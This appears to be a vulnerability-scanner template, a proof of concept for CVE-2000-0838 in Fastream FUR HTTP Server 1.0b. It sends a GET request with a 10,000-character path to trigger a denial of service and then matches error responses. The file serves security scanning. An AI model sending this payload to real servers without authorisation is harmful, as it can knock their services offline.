[info]
author = "AVE"
description = "通过发送超长GET请求检测Fastream FUR HTTP Server 1.0b拒绝服务漏洞"
id = "POC-AVE-2000-0965"
name = "Fastream FUR HTTP Server 1.0b DoS PoC"
severity = "medium"
tags = ["cve-2000-0838"]
vuln_id = [
    "CVE-2000-0838",
    "AVE-2000-0965",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = '/{{BaseURL}}/{{repeat("A", 10000)}}'
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Bad Request",
    "500",
    "Service Unavailable",
]
